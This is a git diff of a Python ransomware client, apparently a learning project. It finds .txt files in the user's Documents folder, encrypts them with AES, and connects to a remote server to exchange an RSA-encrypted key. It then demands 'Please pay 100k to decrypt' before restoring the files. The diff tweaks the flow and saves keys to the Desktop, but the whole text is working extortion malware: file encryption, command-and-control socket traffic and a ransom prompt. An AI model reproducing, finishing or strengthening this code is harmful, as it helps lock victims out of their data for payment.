@@ -1,8 +1,9 @@
 import socket
 import os
 import string
-import pyaes, pbkdf2, secrets
+import secrets
 import rsa
+import pyaes
 
 
 def get_all_txt_files():
@@ -15,7 +16,7 @@ def get_all_txt_files():
     """
 
     root_dir = os.path.join(os.path.join(os.path.expanduser('~')), 'Documents')
-
+    # root_dir = "./test/"
     # Specify the file extension to search for
     extension = '.txt'
 
@@ -27,7 +28,7 @@ def get_all_txt_files():
         # Check each file in the current directory for the specified extension
         for file in files:
             if file.endswith(extension):
-                print(os.path.join(root, file))
+                # print(os.path.join(root, file))
                 file_paths.append(os.path.join(root, file))
 
     return file_paths
@@ -49,13 +50,12 @@ def AES_Key():
     return aes_key
 
 
-def Encrypt_file(aes_key,path):
+def Encrypt_file(aes_key, path):
     file = open(path)
     text = file.readlines()
     text = ''.join(text)
     file.close()
-    print(text)
-
+    # print(text)
     iv = 0
 
     # print(type(iv))
@@ -68,12 +68,13 @@ def Encrypt_file(aes_key,path):
 
 def AES_Key_Encrypt(pu, aes_key):
     aes_key_enc = rsa.encrypt(aes_key, pu)
-    y = open("encryptedKey.key", "wb")
-    y.write(aes_key_enc)
-    y.close()
+    # y = open("encryptedKey.key", "wb")
+    # y.write(aes_key_enc)
+    # y.close()
+    return aes_key_enc
 
 
-def Decrypt_File(aes_key,path):
+def Decrypt_File(aes_key, path):
     file = open(path, "rb")
     ciphertext = file.read()
     # ciphertext = ''.join(ciphertext)
@@ -91,6 +92,7 @@ def Decrypt_File(aes_key,path):
 
 
 def savekey(file_name, parametertoput):
+    # save_path = "./"
     save_path = os.path.join(os.path.join(os.path.expanduser('~')), 'Desktop')
 
     # name_of_file = input("What is the name of the file: ") if you want to always name the file
@@ -113,27 +115,45 @@ SERVER_PORT = 5678
 with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
     s.connect((SERVER_IP, SERVER_PORT))
     # Get Public Key
-    public_key = s.recv(1024)
-    public_key = rsa.PublicKey.load_pkcs1(public_key)
-    print(public_key)
+    hello_msg = s.recv(1024)
+    print("server: " + str(hello_msg))
+    s.send(b'Hello :)')
     # Generate AES key
     aes_key = AES_Key()
-    print(aes_key)
-    s.send(aes_key)
     # Encrypting Files
     files = get_all_txt_files()
+    print("Encrypting Documents txt files")
     for file_path in files:
         print(f"Encrypting {file_path}")
-        Encrypt_file(aes_key,file_path)
+        Encrypt_file(aes_key, file_path)
+
+    savekey("Key", aes_key)
+
+    s.send(b'Send Public Key')
+
+    public_key = s.recv(1024)
+    public_key = rsa.PublicKey.load_pkcs1(public_key)
+    print(f"public_key received: {public_key}")
 
     # Encrypting AES Key
     encrypted_aes_key = AES_Key_Encrypt(public_key, aes_key)
-    # print(data)
+    savekey("encryptedKey", encrypted_aes_key)
 
-    input()
-    s.send(b'Send key')
-    decrypted_aes_key = s.recv(1024)
+    s.send(encrypted_aes_key)
+
+    amount = int(input("Please pay 100k to decrypt: "))
+
+
+
+    s.send(f"{amount}$".encode('utf-8'))
+    decryption_key = s.recv(1024)
+
+    print("Decryption Key Received")
+
+    files = get_all_txt_files()
+    print("Decrypting Documents txt files")
     for file_path in files:
         print(f"Decrypting {file_path}")
-        Decrypt_File(aes_key,file_path)
+        Decrypt_File(aes_key, file_path)
 
+    input("Press to close :)")
